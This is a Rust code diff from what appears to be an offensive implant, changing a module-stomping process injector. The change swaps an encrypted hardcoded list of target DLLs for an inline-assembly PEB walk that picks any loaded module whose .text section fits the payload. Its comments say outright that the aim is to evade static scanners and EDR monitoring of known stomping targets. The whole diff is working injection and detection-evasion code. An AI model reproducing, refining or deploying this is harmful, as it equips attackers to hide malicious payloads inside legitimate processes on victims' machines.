@@ -92,58 +92,93 @@ impl Injector for ModuleStompInjector {
             //     PUNICODE_STRING ModuleFileName,
             //     PVOID *BaseAddress
             //   );
-            // Decrypt candidate DLL names at runtime to avoid plain-text strings
-            // in the .rdata section that static scanners pattern-match against.
-            let c0 = String::from_utf8_lossy(&string_crypt::enc_str!("msfte.dll"))
-                .trim_end_matches('\0')
-                .to_string();
-            let c1 = String::from_utf8_lossy(&string_crypt::enc_str!("msratelc.dll"))
-                .trim_end_matches('\0')
-                .to_string();
-            let c2 = String::from_utf8_lossy(&string_crypt::enc_str!("scrobj.dll"))
-                .trim_end_matches('\0')
-                .to_string();
-            let c3 = String::from_utf8_lossy(&string_crypt::enc_str!("amstream.dll"))
-                .trim_end_matches('\0')
-                .to_string();
-            let candidates: Vec<&str> = vec![c0.as_str(), c1.as_str(), c2.as_str(), c3.as_str()];
-            // Iterate candidates (2.7): pick the first one whose .text section fits the payload
-            let target_dll: &str = candidates
-                .iter()
-                .copied()
-                .find(|dll| {
-                    // Check DLL size by looking for it in the local process first (fast path)
-                    let dll_null = format!("{}\0", dll.to_ascii_lowercase());
-                    let hash = pe_resolve::hash_str(dll_null.as_bytes());
-                    if let Some(base) = pe_resolve::get_module_handle_by_hash(hash) {
-                        // Quick size check: read NT headers to find .text size
-                        unsafe {
+
+            // Enumerate loaded modules via the PEB InLoadOrderModuleList to
+            // build a dynamic candidate list.  Only DLLs whose .text section is
+            // at least as large as the payload are eligible.  This avoids the
+            // static-string list of known stomping targets (msfte.dll, etc.) that
+            // EDR tools specifically monitor for out-of-process writes.
+            //
+            // PEB walk (x86-64): TEB @ gs:[0x30] → PEB @ TEB+0x60 →
+            // Ldr @ PEB+0x18 → InLoadOrderModuleList head @ Ldr+0x10.
+            // LDR_DATA_TABLE_ENTRY offsets (x86-64):
+            //   +0x00  InLoadOrderLinks.Flink
+            //   +0x20  DllBase
+            //   +0x40  BaseDllName.Length (u16, byte count)
+            //   +0x48  BaseDllName.Buffer (pointer to UTF-16)
+            let target_dll: Option<String> = unsafe {
+                use core::arch::asm;
+                let teb: usize;
+                asm!("mov {}, gs:[0x30]", out(reg) teb);
+                let peb = *(teb as *const usize).add(12) as *const u8;
+                let ldr = *(peb.add(0x18) as *const usize) as *const u8;
+                let list_head = ldr.add(0x10) as usize;
+                let mut entry = *(list_head as *const usize) as *const u8;
+
+                let mut found: Option<String> = None;
+                while entry as usize != list_head {
+                    let base = *(entry.add(0x20) as *const usize);
+                    let name_len = *(entry.add(0x40) as *const u16) as usize / 2;
+                    let name_ptr = *(entry.add(0x48) as *const usize) as *const u16;
+
+                    if base != 0 && !name_ptr.is_null() && name_len > 0 {
+                        let slice = std::slice::from_raw_parts(name_ptr, name_len);
+                        let name = String::from_utf16_lossy(slice);
+                        let lname = name.to_ascii_lowercase();
+
+                        let is_excluded = lname.starts_with("ntdll")
+                            || lname.starts_with("kernel32")
+                            || lname.starts_with("kernelbase")
+                            || lname.starts_with("agent")
+                            || lname.len() < 5;
+
+                        if !is_excluded {
                             let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-                            if (*dos).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
-                                return false;
-                            }
-                            let nt = (base + (*dos).e_lfanew as usize)
-                                as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-                            let ns = (*nt).FileHeader.NumberOfSections as usize;
-                            let sec_base = nt as usize
-                                + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>();
-                            for i in 0..ns {
-                                let sec = (sec_base
-                                    + i * std::mem::size_of::<
-                                        winapi::um::winnt::IMAGE_SECTION_HEADER,
-                                    >())
-                                    as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
-                                let name = std::ptr::addr_of!((*sec).Name);
-                                let name_bytes = &*(name as *const [u8; 8]);
-                                if &name_bytes[..5] == b".text" {
-                                    return *(*sec).Misc.VirtualSize() as usize >= payload.len();
+                            if (*dos).e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+                                let nt = (base + (*dos).e_lfanew as usize)
+                                    as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+                                let ns = (*nt).FileHeader.NumberOfSections as usize;
+                                let sec_base = nt as usize
+                                    + std::mem::size_of::<
+                                        winapi::um::winnt::IMAGE_NT_HEADERS64,
+                                    >();
+                                for i in 0..ns {
+                                    let sec = (sec_base
+                                        + i * std::mem::size_of::<
+                                            winapi::um::winnt::IMAGE_SECTION_HEADER,
+                                        >())
+                                        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+                                    let nm = std::ptr::addr_of!((*sec).Name);
+                                    let nm_bytes = &*(nm as *const [u8; 8]);
+                                    if nm_bytes.starts_with(b".text") {
+                                        if *(*sec).Misc.VirtualSize() as usize >= payload.len() {
+                                            found = Some(name);
+                                        }
+                                        break;
+                                    }
                                 }
                             }
                         }
                     }
-                    true // if not loaded yet, optimistically try it
-                })
-                .unwrap_or(candidates[0]);
+
+                    if found.is_some() {
+                        break;
+                    }
+                    entry = *(entry as *const usize) as *const u8;
+                }
+                found
+            };
+            let target_dll = match target_dll {
+                Some(n) => n,
+                None => {
+                    CloseHandle(h_proc);
+                    return Err(anyhow!(
+                        "ModuleStompInjector: no loaded module with a .text \
+                         section large enough to accommodate the payload ({} bytes)",
+                        payload.len()
+                    ));
+                }
+            };
             let wide: Vec<u16> = target_dll
                 .encode_utf16()
                 .chain(std::iter::once(0))
